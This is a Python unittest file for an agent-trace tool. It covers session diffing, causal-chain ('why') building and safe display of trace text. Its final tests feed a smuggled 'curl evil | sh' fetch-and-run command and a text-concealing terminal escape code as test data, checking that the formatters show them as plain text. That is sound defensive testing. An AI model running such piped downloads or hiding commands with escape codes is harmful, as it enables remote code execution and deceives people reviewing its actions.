"""Tests for session diff and causal chain (why)."""

import io
import tempfile
import unittest

from agent_trace.diff import (
    PhaseDiff,
    SessionDiff,
    _lcs_indices,
    diff_sessions,
    format_diff,
)
from agent_trace.models import EventType, SessionMeta, TraceEvent
from agent_trace.store import TraceStore
from agent_trace.why import (
    CausalChain,
    CausalLink,
    build_causal_chain,
    format_why,
)

try:
    import _escapes
except ImportError:
    from tests import _escapes


def _make_event(event_type: EventType, ts: float, session_id: str,
                event_id: str = "", parent_id: str = "", **data) -> TraceEvent:
    e = TraceEvent(event_type=event_type, timestamp=ts, session_id=session_id, data=data)
    if event_id:
        e.event_id = event_id
    if parent_id:
        e.parent_id = parent_id
    return e


def _make_store(sessions: list[tuple[SessionMeta, list[TraceEvent]]]) -> tuple[TraceStore, tempfile.TemporaryDirectory]:
    tmp = tempfile.TemporaryDirectory()
    store = TraceStore(tmp.name)
    for meta, events in sessions:
        store.create_session(meta)
        for e in events:
            store.append_event(meta.session_id, e)
        store.update_meta(meta)
    return store, tmp


# ---------------------------------------------------------------------------
# LCS tests
# ---------------------------------------------------------------------------

class TestLCS(unittest.TestCase):
    def test_identical_lists(self):
        pairs = _lcs_indices(["a", "b", "c"], ["a", "b", "c"])
        self.assertEqual(pairs, [(0, 0), (1, 1), (2, 2)])

    def test_empty_lists(self):
        self.assertEqual(_lcs_indices([], []), [])

    def test_no_common(self):
        self.assertEqual(_lcs_indices(["a", "b"], ["c", "d"]), [])

    def test_partial_match(self):
        pairs = _lcs_indices(["a", "b", "c"], ["a", "x", "c"])
        # Should match a and c
        self.assertIn((0, 0), pairs)
        self.assertIn((2, 2), pairs)

    def test_insertion(self):
        pairs = _lcs_indices(["a", "c"], ["a", "b", "c"])
        self.assertEqual(pairs, [(0, 0), (1, 2)])


# ---------------------------------------------------------------------------
# Diff tests
# ---------------------------------------------------------------------------

class TestDiffSessions(unittest.TestCase):
    def _two_sessions(self, cmds_a, cmds_b, failed_a=False, failed_b=False):
        def _events(sid, cmds, failed):
            evts = [_make_event(EventType.USER_PROMPT, 0.0, sid, prompt="run tests")]
            for i, cmd in enumerate(cmds):
                evts.append(_make_event(EventType.TOOL_CALL, float(i + 1), sid,
                                        tool_name="Bash", arguments={"command": cmd}))
            if failed:
                evts.append(_make_event(EventType.ERROR, float(len(cmds) + 1), sid,
                                        message="exit 1"))
            evts.append(_make_event(EventType.SESSION_END, float(len(cmds) + 2), sid))
            return evts

        meta_a = SessionMeta(session_id="sessa001", started_at=0.0,
                             total_duration_ms=5000, tool_calls=len(cmds_a))
        meta_b = SessionMeta(session_id="sessb001", started_at=0.0,
                             total_duration_ms=4000, tool_calls=len(cmds_b))
        store, tmp = _make_store([
            (meta_a, _events("sessa001", cmds_a, failed_a)),
            (meta_b, _events("sessb001", cmds_b, failed_b)),
        ])
        return store, tmp

    def test_identical_sessions(self):
        store, tmp = self._two_sessions(["pytest"], ["pytest"])
        result = diff_sessions(store, "sessa001", "sessb001")
        self.assertEqual(result.divergence_index, -1)
        tmp.cleanup()

    def test_different_commands_diverge(self):
        store, tmp = self._two_sessions(["pytest"], ["python -m pytest"])
        result = diff_sessions(store, "sessa001", "sessb001")
        self.assertGreater(len(result.phase_diffs), 0)
        tmp.cleanup()

    def test_failed_vs_passed(self):
        store, tmp = self._two_sessions(["pytest"], ["pytest"],
                                        failed_a=True, failed_b=False)
        result = diff_sessions(store, "sessa001", "sessb001")
        failed_diffs = [pd for pd in result.phase_diffs if pd.a_failed != pd.b_failed]
        self.assertTrue(len(failed_diffs) > 0)
        tmp.cleanup()

    def test_duration_captured(self):
        store, tmp = self._two_sessions(["pytest"], ["pytest"])
        result = diff_sessions(store, "sessa001", "sessb001")
        self.assertAlmostEqual(result.duration_a, 5.0, places=0)
        self.assertAlmostEqual(result.duration_b, 4.0, places=0)
        tmp.cleanup()


class TestFormatDiff(unittest.TestCase):
    def test_output_contains_session_ids(self):
        result = SessionDiff(
            session_a="aaa111bbb222",
            session_b="ccc333ddd444",
            divergence_index=0,
            phase_diffs=[
                PhaseDiff(index=0, label_a="run tests", label_b="run tests",
                          same_label=True, files_only_a=[], files_only_b=[],
                          cmds_only_a=["pytest"], cmds_only_b=["python -m pytest"],
                          a_failed=False, b_failed=False)
            ],
            duration_a=10.0, duration_b=8.0,
            events_a=5, events_b=4,
            tool_calls_a=2, tool_calls_b=2,
            retries_a=0, retries_b=0,
        )
        buf = io.StringIO()
        format_diff(result, out=buf)
        output = buf.getvalue()
        self.assertIn("aaa111bbb2", output)
        self.assertIn("ccc333ddd4", output)
        self.assertIn("pytest", output)

    def test_identical_sessions_message(self):
        result = SessionDiff(
            session_a="aaa", session_b="bbb",
            divergence_index=-1, phase_diffs=[],
            duration_a=5.0, duration_b=5.0,
            events_a=3, events_b=3,
            tool_calls_a=1, tool_calls_b=1,
            retries_a=0, retries_b=0,
        )
        buf = io.StringIO()
        format_diff(result, out=buf)
        self.assertIn("identical", buf.getvalue())


# ---------------------------------------------------------------------------
# Why / causal chain tests
# ---------------------------------------------------------------------------

class TestBuildCausalChain(unittest.TestCase):
    def test_empty_events(self):
        chain = build_causal_chain([], 0)
        self.assertEqual(chain.links, [])

    def test_out_of_range(self):
        events = [_make_event(EventType.TOOL_CALL, 0.0, "s1", tool_name="Bash",
                              arguments={"command": "ls"})]
        chain = build_causal_chain(events, 5)
        self.assertEqual(chain.links, [])

    def test_user_prompt_is_root(self):
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "s1", prompt="do it"),
            _make_event(EventType.TOOL_CALL, 1.0, "s1", tool_name="Bash",
                        arguments={"command": "ls"}),
        ]
        chain = build_causal_chain(events, 1)
        types = [l.event.event_type for l in chain.links]
        self.assertIn(EventType.USER_PROMPT, types)

    def test_parent_id_link(self):
        events = [
            _make_event(EventType.TOOL_CALL, 0.0, "s1", event_id="call1",
                        tool_name="Bash", arguments={"command": "ls"}),
            _make_event(EventType.TOOL_RESULT, 1.0, "s1", parent_id="call1",
                        result="file.py"),
        ]
        chain = build_causal_chain(events, 1)
        types = [l.event.event_type for l in chain.links]
        self.assertIn(EventType.TOOL_CALL, types)
        self.assertIn(EventType.TOOL_RESULT, types)

    def test_error_causes_retry(self):
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "s1", prompt="run"),
            _make_event(EventType.TOOL_CALL, 1.0, "s1", tool_name="Bash",
                        arguments={"command": "pytest"}),
            _make_event(EventType.ERROR, 2.0, "s1", message="exit 1"),
            _make_event(EventType.TOOL_CALL, 3.0, "s1", tool_name="Bash",
                        arguments={"command": "pytest"}),
        ]
        chain = build_causal_chain(events, 3)
        types = [l.event.event_type for l in chain.links]
        self.assertIn(EventType.ERROR, types)

    def test_chain_ordered_root_to_target(self):
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "s1", prompt="go"),
            _make_event(EventType.TOOL_CALL, 1.0, "s1", tool_name="Bash",
                        arguments={"command": "ls"}),
        ]
        chain = build_causal_chain(events, 1)
        # Last link should be the target
        self.assertEqual(chain.links[-1].event_index, 1)

    def test_single_event_chain(self):
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "s1", prompt="hello"),
        ]
        chain = build_causal_chain(events, 0)
        self.assertEqual(len(chain.links), 1)
        self.assertEqual(chain.links[0].event.event_type, EventType.USER_PROMPT)

    def test_error_retry_only_fires_for_adjacent_error(self):
        """A tool_call after an error with an unrelated call in between is NOT a retry."""
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "s1", prompt="run"),
            _make_event(EventType.TOOL_CALL, 1.0, "s1", tool_name="Bash",
                        arguments={"command": "pytest"}),
            _make_event(EventType.ERROR, 2.0, "s1", message="exit 1"),
            _make_event(EventType.TOOL_CALL, 3.0, "s1", tool_name="Bash",
                        arguments={"command": "git status"}),   # unrelated
            _make_event(EventType.TOOL_CALL, 4.0, "s1", tool_name="Bash",
                        arguments={"command": "pytest"}),       # actual retry
        ]
        # why #4 (git status) should NOT be attributed to the error
        chain_unrelated = build_causal_chain(events, 3)
        types = [l.event.event_type for l in chain_unrelated.links]
        self.assertNotIn(EventType.ERROR, types)

        # why #5 (retry pytest) SHOULD be attributed to the error
        chain_retry = build_causal_chain(events, 4)
        types_retry = [l.event.event_type for l in chain_retry.links]
        self.assertIn(EventType.ERROR, types_retry)

    def test_write_tool_call_linked_to_prior_read(self):
        """A Write tool_call referencing a path read earlier should link to that read."""
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "s1", prompt="update file"),
            _make_event(EventType.TOOL_CALL, 1.0, "s1", tool_name="Read",
                        arguments={"file_path": "src/foo.py"}),
            _make_event(EventType.TOOL_CALL, 2.0, "s1", tool_name="Write",
                        arguments={"file_path": "src/foo.py"}),
        ]
        chain = build_causal_chain(events, 2)
        types = [l.event.event_type for l in chain.links]
        # Should include the Read tool_call
        self.assertIn(EventType.TOOL_CALL, types)
        read_links = [l for l in chain.links
                      if l.event.data.get("tool_name") == "Read"]
        self.assertTrue(len(read_links) > 0)

    def test_bash_not_linked_to_read_via_path(self):
        """A Bash tool_call sharing a path with a prior Read should NOT be linked via read→write rule."""
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "s1", prompt="check file"),
            _make_event(EventType.TOOL_CALL, 1.0, "s1", tool_name="Read",
                        arguments={"file_path": "src/foo.py"}),
            _make_event(EventType.TOOL_CALL, 2.0, "s1", tool_name="Bash",
                        arguments={"command": "cat src/foo.py"}),
        ]
        chain = build_causal_chain(events, 2)
        # The Bash call has no file_path in arguments, so _event_paths returns empty
        # and the read→write rule should not fire. Root cause should be user_prompt.
        types = [l.event.event_type for l in chain.links]
        self.assertIn(EventType.USER_PROMPT, types)

    def test_why_with_dangling_parent_id(self):
        """An event with a parent_id pointing to a non-existent event should fall through to heuristic."""
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "s1", prompt="go"),
            _make_event(EventType.TOOL_RESULT, 1.0, "s1",
                        parent_id="nonexistent_id", result="done"),
        ]
        # Should not raise; should fall through to heuristic and find user_prompt
        chain = build_causal_chain(events, 1)
        self.assertTrue(len(chain.links) > 0)


class TestDiffSessionsUnaligned(unittest.TestCase):
    def test_session_with_extra_phases(self):
        """Sessions with different numbers of phases should still produce a diff."""
        def _events(sid, cmds):
            evts = [_make_event(EventType.USER_PROMPT, 0.0, sid, prompt="step 1")]
            for i, cmd in enumerate(cmds):
                evts.append(_make_event(EventType.TOOL_CALL, float(i + 1), sid,
                                        tool_name="Bash", arguments={"command": cmd}))
            evts.append(_make_event(EventType.SESSION_END, float(len(cmds) + 2), sid))
            return evts

        meta_a = SessionMeta(session_id="sessa002", started_at=0.0,
                             total_duration_ms=5000, tool_calls=2)
        meta_b = SessionMeta(session_id="sessb002", started_at=0.0,
                             total_duration_ms=3000, tool_calls=1)

        tmp = tempfile.TemporaryDirectory()
        store = TraceStore(tmp.name)
        store.create_session(meta_a)
        for e in _events("sessa002", ["pytest", "coverage report"]):
            store.append_event("sessa002", e)
        store.update_meta(meta_a)

        store.create_session(meta_b)
        for e in _events("sessb002", ["pytest"]):
            store.append_event("sessb002", e)
        store.update_meta(meta_b)

        result = diff_sessions(store, "sessa002", "sessb002")
        # Sessions differ — divergence should be detected
        self.assertGreaterEqual(result.divergence_index, -1)
        tmp.cleanup()


class TestFormatWhy(unittest.TestCase):
    def test_output_contains_event_number(self):
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "s1", prompt="do it"),
            _make_event(EventType.TOOL_CALL, 1.0, "s1", tool_name="Bash",
                        arguments={"command": "ls"}),
        ]
        chain = build_causal_chain(events, 1)
        buf = io.StringIO()
        format_why(chain, events, out=buf)
        self.assertIn("#2", buf.getvalue())

    def test_no_chain_message(self):
        chain = CausalChain(target_index=0, links=[])
        buf = io.StringIO()
        format_why(chain, [], out=buf)
        self.assertIn("No causal chain", buf.getvalue())


E = EventType


def _ev(event_type, **data):
    return _make_event(event_type, 0.0, "s1", **data)


def _call(tool_name, arguments):
    return _ev(E.TOOL_CALL, tool_name=tool_name, arguments=arguments)


def _target(event):
    """Return a chain whose target is *event*, with no prior events."""
    return CausalChain(0, [CausalLink(event, "target event", 0)]), [event]


def _linked(reason):
    """Return a chain whose first link has *reason*."""
    events = [_ev(E.USER_PROMPT, prompt="plain"), _call("plain", {})]
    links = [CausalLink(events[0], reason, 0), CausalLink(events[1], "target event", 1)]
    return CausalChain(1, links), events


def _why_text(chain_and_events):
    chain, events = chain_and_events
    buf = io.StringIO()
    format_why(chain, events, out=buf)
    return buf.getvalue()


def _phase(**fields):
    values = dict(index=0, label_a="plain", label_b="plain", same_label=True,
                  files_only_a=[], files_only_b=[], cmds_only_a=[], cmds_only_b=[],
                  a_failed=True, b_failed=False)
    values.update(fields)
    return PhaseDiff(**values)


def _session_diff(phase=None, **fields):
    values = dict(session_a="aaa111", session_b="bbb222", divergence_index=0,
                  phase_diffs=[phase or _phase()], duration_a=1.0, duration_b=1.0,
                  events_a=1, events_b=1, tool_calls_a=1, tool_calls_b=1,
                  retries_a=0, retries_b=0)
    values.update(fields)
    return SessionDiff(**values)


def _diff_text(result):
    buf = io.StringIO()
    format_diff(result, out=buf)
    return buf.getvalue()


def _stored_diff(command_a, command_b):
    """Return the diff of two stored sessions that each ran one command."""
    sessions = []
    for sid, command in (("sessa003", command_a), ("sessb003", command_b)):
        events = [
            _make_event(E.USER_PROMPT, 0.0, sid, prompt="run tests"),
            _make_event(E.TOOL_CALL, 1.0, sid, tool_name="Bash", arguments={"command": command}),
        ]
        sessions.append((SessionMeta(session_id=sid, started_at=0.0), events))
    store, tmp = _make_store(sessions)
    try:
        return _diff_text(diff_sessions(store, "sessa003", "sessb003"))
    finally:
        tmp.cleanup()


# (label, kind, build): build(value) returns the input of the formatter with
# value in the place the label names. The kinds are in tests/_escapes.py.
FORMAT_WHY_CASES = [
    ("tool_call tool_name", "text", lambda v: _target(_call(v, {}))),
    ("Bash command", "text", lambda v: _target(_call("Bash", {"command": v}))),
    ("Read file_path", "text", lambda v: _target(_call("Read", {"file_path": v}))),
    ("tool_result result", "free", lambda v: _target(_ev(E.TOOL_RESULT, result=v))),
    ("tool_result content_preview", "free",
     lambda v: _target(_ev(E.TOOL_RESULT, content_preview=v))),
    ("tool_result text", "free", lambda v: _target(_ev(E.TOOL_RESULT, text=v))),
    ("error message", "free", lambda v: _target(_ev(E.ERROR, message=v))),
    ("error error", "free", lambda v: _target(_ev(E.ERROR, error=v))),
    ("user_prompt prompt", "free", lambda v: _target(_ev(E.USER_PROMPT, prompt=v))),
    ("assistant_response text", "free", lambda v: _target(_ev(E.ASSISTANT_RESPONSE, text=v))),
    ("file_read uri", "text", lambda v: _target(_ev(E.FILE_READ, uri=v))),
    ("file_write uri", "text", lambda v: _target(_ev(E.FILE_WRITE, uri=v))),
    ("file_read file_path", "text", lambda v: _target(_ev(E.FILE_READ, file_path=v))),
    ("link reason", "free", _linked),
]

FORMAT_DIFF_CASES = [
    ("phase label", "free", lambda v: _session_diff(_phase(label_a=v))),
    ("command only in A", "text", lambda v: _session_diff(_phase(cmds_only_a=[v]))),
    ("command only in B", "text", lambda v: _session_diff(_phase(cmds_only_b=[v]))),
    ("file only in A", "text", lambda v: _session_diff(_phase(files_only_a=[v]))),
    ("file only in B", "text", lambda v: _session_diff(_phase(files_only_b=[v]))),
    ("tool_calls A", "text", lambda v: _session_diff(tool_calls_a=v)),
    ("tool_calls B", "text", lambda v: _session_diff(tool_calls_b=v)),
]

# (label, cut, build): the formatter keeps cut characters of the value the
# label names.
FORMAT_WHY_CUTS = [
    ("Bash command", 60, lambda v: _target(_call("Bash", {"command": v}))),
    ("tool_result result", 60, lambda v: _target(_ev(E.TOOL_RESULT, result=v))),
    ("tool_result content_preview", 60,
     lambda v: _target(_ev(E.TOOL_RESULT, content_preview=v))),
    ("tool_result text", 60, lambda v: _target(_ev(E.TOOL_RESULT, text=v))),
    ("error message", 60, lambda v: _target(_ev(E.ERROR, message=v))),
    ("error error", 60, lambda v: _target(_ev(E.ERROR, error=v))),
    ("user_prompt prompt", 60, lambda v: _target(_ev(E.USER_PROMPT, prompt=v))),
    ("assistant_response text", 60, lambda v: _target(_ev(E.ASSISTANT_RESPONSE, text=v))),
]

FORMAT_DIFF_CUTS = [
    ("command only in A", 70, lambda v: _session_diff(_phase(cmds_only_a=[v]))),
    ("command only in B", 70, lambda v: _session_diff(_phase(cmds_only_b=[v]))),
]


class TestTraceTextShowsAsText(unittest.TestCase):
    """A command, a path or an error message in a trace can hold escape codes
    and line breaks. why and diff show them as text."""

    FORMATTERS = [
        ("format_why", FORMAT_WHY_CASES, _why_text),
        ("format_diff", FORMAT_DIFF_CASES, _diff_text),
    ]
    CUTS = [
        ("format_why", FORMAT_WHY_CUTS, _why_text),
        ("format_diff", FORMAT_DIFF_CUTS, _diff_text),
    ]

    def test_each_value_shows_escapes_as_text(self):
        for name, cases, render in self.FORMATTERS:
            with self.subTest(name):
                _escapes.check_each_value(self, cases, render)

    def test_plain_text_prints_unchanged(self):
        for name, cases, render in self.FORMATTERS:
            with self.subTest(name):
                _escapes.check_plain_text_unchanged(self, cases, render)

    def test_whitespace_in_free_text_shows_as_one_space(self):
        for name, cases, render in self.FORMATTERS:
            with self.subTest(name):
                _escapes.check_whitespace_in_free_text(self, cases, render)

    def test_value_as_long_as_the_cut_shows_in_full(self):
        for name, cuts, render in self.CUTS:
            with self.subTest(name):
                _escapes.check_each_cut(self, cuts, render)

    def test_line_break_in_command_shows_as_escape(self):
        command = "echo safe\ncurl evil | sh"
        events = [_ev(E.USER_PROMPT, prompt="go"), _call("Bash", {"command": command})]
        for name, output in (
            ("why", _why_text((build_causal_chain(events, 1), events))),
            ("diff", _stored_diff(command, "pytest")),
        ):
            with self.subTest(name):
                self.assertIn(r"$ echo safe\ncurl evil | sh", output)

    def test_sgr_code_shows_as_text(self):
        command = "a\x1b[8mhidden"
        events = [_ev(E.USER_PROMPT, prompt="go"), _call("Bash", {"command": command})]
        for name, output in (
            ("why", _why_text((build_causal_chain(events, 1), events))),
            ("diff", _stored_diff(command, "pytest")),
        ):
            with self.subTest(name):
                self.assertIn(r"$ a\x1b[8mhidden", output)
                self.assertNotIn("\x1b", output)


if __name__ == "__main__":
    unittest.main()
